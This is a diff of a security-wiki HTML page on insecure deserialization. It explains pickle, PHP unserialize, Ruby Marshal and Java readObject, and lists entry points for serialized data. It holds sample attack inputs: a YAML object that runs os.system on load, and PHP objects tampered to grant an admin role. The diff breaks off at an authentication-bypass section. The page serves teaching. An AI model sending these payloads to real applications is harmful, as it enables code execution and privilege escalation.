@@ -1,49 +1,72 @@
 <!DOCTYPE html>
-<html lang="en" dir="ltr">
+<html lang="en" dir="ltr" data-theme="light">
 <head>
-  <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Insecure Deserialization # -&ndash;
--&ndash;
-## Introduction
-### What is Serialization
-It is a process to convert the complex data structures (like objects in object oriented programming) into the simpler format that can be easily stored and transferred.
-### What is Deserialization
-It is the **reverse process of serialization**, where the **simple formatted data (like JSON, XML, or binary)** is converted **back into its original complex data structure or object**.">
-<meta name="theme-color" content="#FFFFFF">
-<meta name="color-scheme" content="light dark"><meta property="og:title" content="Insecure Deserialization" />
-<meta property="og:description" content="Insecure Deserialization # -&ndash;
--&ndash;
-## Introduction
-### What is Serialization
-It is a process to convert the complex data structures (like objects in object oriented programming) into the simpler format that can be easily stored and transferred.
-### What is Deserialization
-It is the **reverse process of serialization**, where the **simple formatted data (like JSON, XML, or binary)** is converted **back into its original complex data structure or object**." />
-<meta property="og:type" content="article" />
-<meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/" /><meta property="article:section" content="docs" />
-
-<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30" />
-<title>Insecure Deserialization | Cyber Security Wiki</title>
-<link rel="manifest" href="/manifest.json">
-<link rel="icon" href="/favicon.png" type="image/x-icon">
-<link rel="stylesheet" href="/book.min.565a95e2043493949e3fa72db3ec317e1e40f462858e732a1b18d1354e9c030c.css" integrity="sha256-VlqV4gQ0k5SeP6cts&#43;wxfh5A9GKFjnMqGxjRNU6cAww=" crossorigin="anonymous">
-  <script defer src="/flexsearch.min.js"></script>
-  <script defer src="/en.search.min.78166b9d46e23e0ea915cb6887a30b633e7bc4fad10c8b6b9f6fa532271c19ba.js" integrity="sha256-eBZrnUbiPg6pFctoh6MLYz57xPrRDItrn2&#43;lMiccGbo=" crossorigin="anonymous"></script>
-
-  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
-<!--
+  <!--
 Made with Book Theme
 https://github.com/alex-shpak/hugo-book
 -->
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Insecure Deserialization# -–
+-–
+## Introduction
+### What is Serialization
+It is a process to convert the complex data structures (like objects in object oriented programming) into the simpler format that can be easily stored and transferred.
+### What is Deserialization
+It is the **reverse process of serialization**, where the **simple formatted data (like JSON, XML, or binary)** is converted **back into its original complex data structure or object**. In simple terms, **deserialization rebuilds the original object from the stored or transmitted data** so that the application can use it again.
+">
+<meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff">
+<meta name="theme-color" media="(prefers-color-scheme: dark)" content="#2e3440">
+<meta name="color-scheme" content="light dark"><meta property="og:url" content="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/">
+	<meta property="og:site_name" content="Cyber Security Wiki">
+	<meta property="og:title" content="Insecure Deserialization">
+	<meta property="og:description" content="Insecure Deserialization# -–
+-–
+## Introduction
+### What is Serialization
+It is a process to convert the complex data structures (like objects in object oriented programming) into the simpler format that can be easily stored and transferred.
+### What is Deserialization
+It is the **reverse process of serialization**, where the **simple formatted data (like JSON, XML, or binary)** is converted **back into its original complex data structure or object**. In simple terms, **deserialization rebuilds the original object from the stored or transmitted data** so that the application can use it again.">
+	<meta property="og:locale" content="en">
+	<meta property="og:type" content="article">
+		<meta property="article:section" content="docs">
+		<meta property="article:modified_time" content="2026-08-05T21:53:05+05:30">
+
+
+	<meta itemprop="name" content="Insecure Deserialization">
+	<meta itemprop="description" content="Insecure Deserialization# -–
+-–
+## Introduction
+### What is Serialization
+It is a process to convert the complex data structures (like objects in object oriented programming) into the simpler format that can be easily stored and transferred.
+### What is Deserialization
+It is the **reverse process of serialization**, where the **simple formatted data (like JSON, XML, or binary)** is converted **back into its original complex data structure or object**. In simple terms, **deserialization rebuilds the original object from the stored or transmitted data** so that the application can use it again.">
+	<meta itemprop="dateModified" content="2026-08-05T21:53:05+05:30">
+	<meta itemprop="wordCount" content="2551">
+
+<title>Insecure Deserialization • Cyber Security Wiki</title>
+<link rel="icon" href="/favicon.png" >
+<link rel="manifest" href="/manifest.json">
+<link rel="canonical" href="https://cyber-security.wiki/docs/application-security/web/Insecure-Deserialization/">
+<link rel="stylesheet" href="/book.min.4d77e98d764f495b145946ef9260681bab38aaf7bc01f96a6f61a3a0fea19dbf.css" integrity="sha256-TXfpjXZPSVsUWUbvkmBoG6s4qve8Aflqb2GjoP6hnb8=" crossorigin="anonymous">
+
+
+
+  <script defer type="module" src="/en.search.min.07d8a67671a2c683431c7034b07b0f4b6c6daae7a9c289fde2e3663a9ff4e6c5.js" integrity="sha256-B9imdnGixoNDHHA0sHsPS2xtquepwon94uNmOp/05sU=" crossorigin="anonymous"></script>
+
+  <script defer src="/sw.min.6f6f90fcb8eb1c49ec389838e6b801d0de19430b8e516902f8d75c3c8bd98739.js" integrity="sha256-b2&#43;Q/LjrHEnsOJg45rgB0N4ZQwuOUWkC&#43;NdcPIvZhzk=" crossorigin="anonymous"></script>
+
   
 </head>
-<body dir="ltr">
+<body dir="ltr" class="book-kind-page book-type-docs">
   <input type="checkbox" class="hidden toggle" id="menu-control" />
   <input type="checkbox" class="hidden toggle" id="toc-control" />
   <main class="container flex">
-    <aside class="book-menu">
-      <div class="book-menu-content">
-        
+    
+<aside class="book-menu">
+  <div class="book-menu-content">
+    
   <nav>
 <h2 class="book-brand">
   <a class="flex align-center" href="/"><img src="/logo.png" alt="Logo" /><span>Cyber Security Wiki</span>
@@ -51,11 +74,15 @@ https://github.com/alex-shpak/hugo-book
 </h2>
 
 
-<div class="book-search">
-  <input type="text" id="book-search-input" placeholder="Search" aria-label="Search" maxlength="64" data-hotkeys="s/" />
+<div class="book-search hidden">
+  <input id="book-search-input" type="text" 
+    placeholder="Search"
+    aria-label="Search"
+    maxlength="64" />
   <div class="book-search-spinner hidden"></div>
   <ul id="book-search-results"></ul>
 </div>
+<script>document.querySelector(".book-search").classList.remove("hidden")</script>
 
 
 
@@ -66,9 +93,6 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-
-
-  
 
 
 
@@ -83,8 +107,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3478c05c39c328756601a040a5f9b7dc" class="toggle" checked />
-    <label for="section-3478c05c39c328756601a040a5f9b7dc" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-1f4bf90b10ddb9d04537ec779b672afa" class="toggle" checked />
+    <label for="section-1f4bf90b10ddb9d04537ec779b672afa" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Application Security</a>
     </label>
   
@@ -100,8 +124,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3d187f458be5e96a9f7134b06fcbe171" class="toggle"  />
-    <label for="section-3d187f458be5e96a9f7134b06fcbe171" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-97ce584ed7ffb43a07e43ad9f5889c71" class="toggle"  />
+    <label for="section-97ce584ed7ffb43a07e43ad9f5889c71" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Thick Client</a>
     </label>
   
@@ -187,8 +211,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="toggle"  />
-    <label for="section-0a8389ed2dba897f3cc2a5f45ae28a35" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-26c356cfc062017e944cd67af2378245" class="toggle"  />
+    <label for="section-26c356cfc062017e944cd67af2378245" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Vulnerable Applications</a>
     </label>
   
@@ -235,8 +259,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-305f8624390448e7b7dfdcd57bcf3063" class="toggle" checked />
-    <label for="section-305f8624390448e7b7dfdcd57bcf3063" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-db0925704b156fffd3db5c66cb42d41d" class="toggle" checked />
+    <label for="section-db0925704b156fffd3db5c66cb42d41d" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Web</a>
     </label>
   
@@ -990,8 +1014,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-eddb28de10b6358a7d90165be197c24d" class="toggle"  />
-    <label for="section-eddb28de10b6358a7d90165be197c24d" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="toggle"  />
+    <label for="section-0d71dd2ccc73d3f39ad17c2db51c8573" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Cloud Security</a>
     </label>
   
@@ -1012,8 +1036,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-80f73357b2e3d82569ab2419d9c8fd53" class="toggle"  />
-    <label for="section-80f73357b2e3d82569ab2419d9c8fd53" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5ef99b8721144773b97f7bfef900362b" class="toggle"  />
+    <label for="section-5ef99b8721144773b97f7bfef900362b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">DevSecOps</a>
     </label>
   
@@ -1034,8 +1058,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-f8c2cedc89ecea36eb3aab749e9d9325" class="toggle"  />
-    <label for="section-f8c2cedc89ecea36eb3aab749e9d9325" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="toggle"  />
+    <label for="section-a54fb62d899fdd9f3e0ff5a546ca08ec" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Exploit Development</a>
     </label>
   
@@ -1056,8 +1080,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="toggle"  />
-    <label for="section-ac63c4b6399921ce8f97ed202a2ebcb8" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-2aeefa6ddff0a8e5db97003607c446af" class="toggle"  />
+    <label for="section-2aeefa6ddff0a8e5db97003607c446af" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">IoT Security</a>
     </label>
   
@@ -1078,8 +1102,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="toggle"  />
-    <label for="section-ff3f320cd65cf7b2cc2597d57706ff2e" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-150b068623f422b911e0c10751e41d4b" class="toggle"  />
+    <label for="section-150b068623f422b911e0c10751e41d4b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Machine Learning</a>
     </label>
   
@@ -1113,8 +1137,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-3110560962cac834dcd3aead95e804a4" class="toggle"  />
-    <label for="section-3110560962cac834dcd3aead95e804a4" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5d1d2284d8b625a6ff29beaf70c29606" class="toggle"  />
+    <label for="section-5d1d2284d8b625a6ff29beaf70c29606" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Network</a>
     </label>
   
@@ -1135,8 +1159,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-089d0b2a47920473e631158da2244e55" class="toggle"  />
-    <label for="section-089d0b2a47920473e631158da2244e55" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="toggle"  />
+    <label for="section-5f3c3bc6686a139a7fd4ba11c67ca45b" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Red Teaming</a>
     </label>
   
@@ -1157,8 +1181,8 @@ https://github.com/alex-shpak/hugo-book
 
   
     <br>
-    <input type="checkbox" id="section-b1f24361e619eb3af87e435a6f600cbe" class="toggle"  />
-    <label for="section-b1f24361e619eb3af87e435a6f600cbe" class="flex justify-between" style="font-weight: bold;">
+    <input type="checkbox" id="section-48d01542c459fd722a2e871cc9bbd985" class="toggle"  />
+    <label for="section-48d01542c459fd722a2e871cc9bbd985" class="flex justify-between" style="font-weight: bold;">
       <a role="button" class="">Threat Modelling</a>
     </label>
   
@@ -1179,35 +1203,13 @@ https://github.com/alex-shpak/hugo-book
 
 
 
-<hr>
-<b>
 
-
-  
-<ul>
-  
-  <li>
-    <a href="/contribute/" >
-        Contribute
-      </a>
-  </li>
-  
-  <li>
-    <a href="https://securecode.wiki" target="_blank" rel="noopener">
-        Secure Code Wiki by Payatu
-      </a>
-  </li>
-  
-</ul>
+<ul><li><a href="/contribute/" title="Contribute">contribute</a></li><li><a href="https://securecode.wiki" target="_blank" rel="noopener">Secure Code Wiki by Payatu</a></li></ul>
 
 
 
 
-
-
-</b>
 </nav>
-
 
 
 
@@ -1215,30 +1217,31 @@ https://github.com/alex-shpak/hugo-book
   <script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script>
 
 
+
+  </div>
+</aside>
  
-      </div>
-    </aside>
 
     <div class="book-page">
-      <header class="book-header">
+      <header class="book-header hidden">
         
   <div class="flex align-center justify-between">
   <label for="menu-control">
-    <img src="/svg/menu.svg" class="book-icon" alt="Menu" />
+    <img src="/icons/menu.svg" class="book-icon" alt="Menu" />
   </label>
 
-  <strong>Insecure Deserialization</strong>
+  <h3>Insecure Deserialization</h3>
 
   <label for="toc-control">
     
-    <img src="/svg/toc.svg" class="book-icon" alt="Table of Contents" />
+    <img src="/icons/toc.svg" class="book-icon" alt="Table of Contents" />
     
   </label>
 </div>
 
 
   
-  <aside class="hidden clearfix">
+  <aside class="hidden">
     
   
 <nav id="TableOfContents">
@@ -1256,10 +1259,7 @@ https://github.com/alex-shpak/hugo-book
 
       
       
-  <article class="markdown"><h1 id="insecure-deserialization">
-  Insecure Deserialization
-  <a class="anchor" href="#insecure-deserialization">#</a>
-</h1>
+  <article class="markdown book-article"><h1 id="insecure-deserialization">Insecure Deserialization<a class="anchor" href="#insecure-deserialization">#</a></h1>
 <p>-&ndash;</p>
 <p>-&ndash;</p>
 <p>## Introduction</p>
@@ -1279,40 +1279,33 @@ https://github.com/alex-shpak/hugo-book
 <p>- **Module:** <code>pickle</code></p>
 <p>- **Serialization** is converting object to byte stream</p>
 <pre tabindex="0"><code>
-pickle.dumps(object)
-</code></pre><p>- This converts a Python object into a **serialized byte format** that can be stored in a file or sent over a network.</p>
+pickle.dumps(object)</code></pre><p>- This converts a Python object into a **serialized byte format** that can be stored in a file or sent over a network.</p>
 <p>- **Deserialization** (byte stream → object)</p>
 <pre tabindex="0"><code>
-pickle.loads(serialized\_object)
-</code></pre><p>- This reconstructs the **original Python object** from the serialized data.</p>
+pickle.loads(serialized\_object)</code></pre><p>- This reconstructs the **original Python object** from the serialized data.</p>
 <p>- If untrusted data is deserialized using <code>pickle.loads()</code>, it may lead to **Remote Code Execution (RCE)**.</p>
 <p>-&ndash;</p>
 <p>### PHP</p>
 <p>PHP provides built-in functions to convert objects into a storable string format and reconstruct them later.</p>
 <p>- **Serialization**</p>
 <pre tabindex="0"><code>
-serialize($object);
-</code></pre><p>- **Deserialization**</p>
+serialize($object);</code></pre><p>- **Deserialization**</p>
 <pre tabindex="0"><code>
-unserialize($data);
-</code></pre><p>- <code>unserialize()</code> can be dangerous if it processes **untrusted user input**, as it may trigger **magic methods** like <code>\_\_wakeup()</code> or <code>\_\_destruct()</code></p>
+unserialize($data);</code></pre><p>- <code>unserialize()</code> can be dangerous if it processes **untrusted user input**, as it may trigger **magic methods** like <code>\_\_wakeup()</code> or <code>\_\_destruct()</code></p>
 <p>-&ndash;</p>
 <p>### Ruby</p>
 <p>Ruby uses a process called **Marshalling** for object serialization.</p>
 <p>- **Serialization**</p>
 <pre tabindex="0"><code>
-Marshal.dump(object)
-</code></pre><p>- **Deserialization**</p>
+Marshal.dump(object)</code></pre><p>- **Deserialization**</p>
 <pre tabindex="0"><code>
-Marshal.load(data)
-</code></pre><p>- This converts Ruby objects into a byte stream and restores them back into objects.</p>
+Marshal.load(data)</code></pre><p>- This converts Ruby objects into a byte stream and restores them back into objects.</p>
 <p>-&ndash;</p>
 <p>### Java</p>
 <p>Java uses built-in **object serialization** through the <code>Serializable</code> interface.</p>
 <p>- **Deserialization Method**</p>
 <pre tabindex="0"><code>
-readObject()
-</code></pre><p>- The <code>readObject()</code> method reconstructs objects from a serialized stream. If an attacker controls the serialized data, it can lead to **Insecure Deserialization vulnerabilities**.</p>
+readObject()</code></pre><p>- The <code>readObject()</code> method reconstructs objects from a serialized stream. If an attacker controls the serialized data, it can lead to **Insecure Deserialization vulnerabilities**.</p>
 <p>-&ndash;</p>
 <p>This version makes the **fundamentals section slightly richer** by:</p>
 <p>- Adding **context**</p>
@@ -1328,9 +1321,8 @@ readObject()
 <p>### Hidden Form Fields</p>
 <p>Applications sometimes serialize objects into hidden fields.</p>
 <p>**Example**</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">inputtype</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">hidden</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;userObj&#34;</span><span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;O:4:&#39;User&#39;:1:{s:4:&#39;role&#39;;s:4:&#39;user&#39;;}&#34;</span>&gt; 
-</span></span></code></pre></div><p>### API Request Bodies</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">inputtype</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">hidden</span><span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;userObj&#34;</span><span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;O:4:&#39;User&#39;:1:{s:4:&#39;role&#39;;s:4:&#39;user&#39;;}&#34;</span>&gt; </span></span></code></pre></div><p>### API Request Bodies</p>
 <p>Many modern APIs accept serialized objects.</p>
 <p>- **JSON Deserialization**</p>
 <pre tabindex="0"><code>
@@ -1344,8 +1336,7 @@ readObject()
 
 &amp;#x20; }
 
-}
-</code></pre><p>- **XML Deserialization**</p>
+}</code></pre><p>- **XML Deserialization**</p>
 <pre tabindex="0"><code>
 &lt;user&gt;
 
@@ -1353,11 +1344,9 @@ readObject()
 
 &lt;role&gt;user&lt;/role&gt;
 
-&lt;/user&gt;
-</code></pre><p>- **YAML Deserialization**</p>
+&lt;/user&gt;</code></pre><p>- **YAML Deserialization**</p>
 <pre tabindex="0"><code>
-!!python/object/apply:os.system \[&#34;id&#34;]
-</code></pre><p>### File Upload Features</p>
+!!python/object/apply:os.system \[&#34;id&#34;]</code></pre><p>### File Upload Features</p>
 <p>Applications may deserialize uploaded files with these extensions.</p>
 <p>- <code>.ser</code></p>
 <p>- <code>.bin</code></p>
@@ -1368,8 +1357,7 @@ readObject()
 <p>### HTTP Headers</p>
 <p>Serialized objects sometimes appear in headers.</p>
 <pre tabindex="0"><code>
-X-User-Data: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA
-</code></pre><p>Other headers to check:</p>
+X-User-Data: rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA</code></pre><p>Other headers to check:</p>
 <pre tabindex="0"><code>
 Authorization
 
@@ -1377,29 +1365,26 @@ X-Session
 
 X-User
 
-X-Auth-Token
-</code></pre><p>### JWT Serialization</p>
+X-Auth-Token</code></pre><p>### JWT Serialization</p>
 <p>Developers some times embed serialized objects into JWTs</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&amp;#x20;&#34;user&#34;:&#34;O:4:\\&#34;User\\&#34;:1:{s:4:\\&#34;role\\&#34;;s:5:\\&#34;admin\\&#34;;}&#34;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>### WebSocket Messages</p>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>### WebSocket Messages</p>
 <p>Real-time apps may send serialized objects</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&amp;#x20;&#34;action&#34;:&#34;updateUser&#34;,
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>&amp;#x20;&#34;data&#34;:&#34;O:4:\\&#34;User\\&#34;:1:{s:4:\\&#34;role\\&#34;;s:5:\\&#34;user\\&#34;;}&#34;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>## Exploitation</p>
+</span></span><span style="display:flex;"><span>}</span></span></code></pre></div><p>## Exploitation</p>
 <p>### PHP Deserialization</p>
 <p>#### PHP Class and Objects</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
@@ -1407,17 +1392,17 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">User</span> {
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#75715e">#x09;	public $name;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#75715e">#x09;	public $age
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#75715e">#x09;	function \_\_construct($name, $age){
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#75715e">#x09;	$this-&gt;name = $name;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#75715e">#x09;	$this-&gt;age = $age;
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#f92672">&amp;</span><span style="color:#75715e">#x09;	}
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>$user1 <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">User</span>(<span style="color:#e6db74">&#39;bandit&#39;</span>, <span style="color:#ae81ff">25</span>);
@@ -1427,12 +1412,11 @@ X-Auth-Token
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> $user1<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">age</span>;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($user1);  <span style="color:#75715e"># serializing object user1
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
 </span></span></span></code></pre></div><p>- Serialized Object</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;name&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Adil&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;age&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">24</span>;}
-</span></span></code></pre></div><p>#### PHP Magic Methods</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">O</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;User&#34;</span><span style="color:#f92672">:</span><span style="color:#ae81ff">2</span><span style="color:#f92672">:</span>{<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;name&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">4</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;Adil&#34;</span>;<span style="color:#a6e22e">s</span><span style="color:#f92672">:</span><span style="color:#ae81ff">3</span><span style="color:#f92672">:</span><span style="color:#e6db74">&#34;age&#34;</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">:</span><span style="color:#ae81ff">24</span>;}</span></span></code></pre></div><p>#### PHP Magic Methods</p>
 <p>| Magic Method | Description | Example |</p>
 <p>| &mdash; | &mdash; | &mdash; |</p>
 <p>| **<code>\_\_construct</code>** | Defines a constructor for a class. Called when a new instance is created. | <code>new Class()</code> |</p>
@@ -1455,36 +1439,30 @@ X-Auth-Token
 <p>#### Authentication Bypass</p>
 <p>- **<code>Modifying Object Attribute Value</code>**</p>
 <p>- Set the boolean value to 1 in serialized PHP object to set the user as an admin user</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>
